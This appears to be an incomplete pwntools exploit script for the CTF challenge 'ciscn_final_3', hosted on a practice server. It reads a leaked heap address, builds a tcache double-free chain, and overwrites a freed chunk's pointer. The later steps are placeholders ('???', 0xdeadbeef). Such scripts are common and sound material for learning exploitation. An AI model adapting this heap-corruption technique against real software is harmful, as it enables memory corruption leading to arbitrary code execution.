from pwn import *
from time import *
context.binary = './ciscn_final_3'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


def dbg():
	raw_input()

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20232)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_final_3')
	gdb.attach(p)
	dbg()

def menu(i):
	p.recvuntil('choice > ')
	p.sendline(str(i))

def add(idx, size, content):
	menu(1)
	p.recvuntil('the index\n')
	p.sendline(str(idx))
	p.recvuntil('the size\n')
	p.sendline(str(size))
	p.recvuntil('something\n')
	p.send(content)

	print "add note %d " % idx


def remove(idx):
	menu(2)
	p.recvuntil('the index\n')
	p.sendline(str(idx))

	print "remove note %d " % idx


add(0, 0x40, 'a'*0x40)	#0
p.recvuntil('gift :')
heap_addr = int(p.recvline().strip('\x0a'), 16) - 0x11c20

add(1, 0x10, 'b'*0x10)	#1
add(2, 0x10, 'c'*0x10)	#2

#double free chain 2-> 1 ->2
remove(2)
remove(1)
remove(2)			

add(3, 0x10, p64(heap_addr+0x10))#3=2		
add(4, 0x10, p64(0xdeadbeef))	#4=1
add(5, 0x10, p64(0xdeadbeef))	#5=?

print "heap_addr ==> " + hex(heap_addr)

add(6, 0x10, '???')

p.interactive()
p.close()